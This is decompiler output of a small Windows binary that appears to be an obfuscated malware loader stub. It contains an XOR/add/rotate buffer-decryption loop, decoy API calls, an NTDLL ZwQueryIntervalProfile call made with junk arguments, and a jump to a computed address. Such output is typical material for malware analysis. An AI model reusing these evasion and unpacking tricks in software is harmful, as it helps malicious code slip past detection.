/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

_DWORD *__stdcall sub_401017(_DWORD *a1, unsigned int a2, int a3);
int start();
// DWORD __stdcall GetFileType(HANDLE hFile);
// LPSTR __stdcall GetCommandLineA();
// DWORD __stdcall GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh);
// DWORD __stdcall GetCurrentProcessId();
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// DWORD __stdcall GetTickCount();
// BOOL __stdcall CloseHandle(HANDLE hObject);
// HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// LPWSTR __stdcall GetCommandLineW();
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);

//-------------------------------------------------------------------------
// Data declarations

char byte_401155[3] = { '\xFF', '\x15', '\x1C' }; // weak


//----- (00401017) --------------------------------------------------------
_DWORD *__stdcall sub_401017(_DWORD *a1, unsigned int a2, int a3)
{
  _DWORD *result; // eax
  unsigned int v4; // ecx

  result = a1;
  v4 = a2 >> 2;
  do
  {
    *result += a3;
    *result += a3;
    *result ^= a3;
    *result ^= 0x157EDF2Bu;
    *result += 93003008;
    *result = __ROR4__(*result, 160);
    *result++ += 1595729974;
    --v4;
  }
  while ( v4 );
  return result;
}

//----- (00401082) --------------------------------------------------------
int start()
{
  HANDLE hFile; // [esp+0h] [ebp-1Ch]
  HMODULE hFilea; // [esp+0h] [ebp-1Ch]
  FARPROC ZwQueryIntervalProfile; // [esp+4h] [ebp-18h]
  HANDLE hObject; // [esp+8h] [ebp-14h]
  int v5; // [esp+Ch] [ebp-10h]
  int v6; // [esp+10h] [ebp-Ch]
  LPSTR v7; // [esp+14h] [ebp-8h]
  int v8; // [esp+18h] [ebp-4h]
  int v9; // [esp+18h] [ebp-4h]
  int savedregs; // [esp+1Ch] [ebp+0h]

  GetCommandLineW();
  GetFileSize(hFile, 0);
  hFilea = GetModuleHandleA("NTDLL.DLL");
  GetFileType(hFilea);
  v7 = GetCommandLineA();
  hObject = CreateFileA("TGsfFJdAbJkZb.fYP", 0xC0000000, 3u, 0, 3u, 0x81u, 0);
  ZwQueryIntervalProfile = GetProcAddress(hFilea, "ZwQueryIntervalProfile");
  CloseHandle(hObject);
  GetTickCount();
  GetCurrentProcessId();
  v9 = ((int (__stdcall *)(_DWORD, _DWORD, HMODULE, FARPROC, HANDLE, int, int, LPSTR, int, int))ZwQueryIntervalProfile)(
         0,
         0,
         hFilea,
         ZwQueryIntervalProfile,
         hObject,
         v5,
         v6,
         v7,
         v8,
         savedregs);
  GetCommandLineW();
  return ((int (*)(void))&byte_401155[v9 ^ 0xC0000005])();
}
// 40109B: variable 'hFile' is possibly undefined
// 401121: variable 'v5' is possibly undefined
// 401121: variable 'v6' is possibly undefined
// 401121: variable 'v8' is possibly undefined
// 401121: variable 'savedregs' is possibly undefined

// nfuncs=2 queued=2 decompiled=2 lumina nreq=0 worse=0 better=0
// ALL OK, 2 function(s) have been successfully decompiled
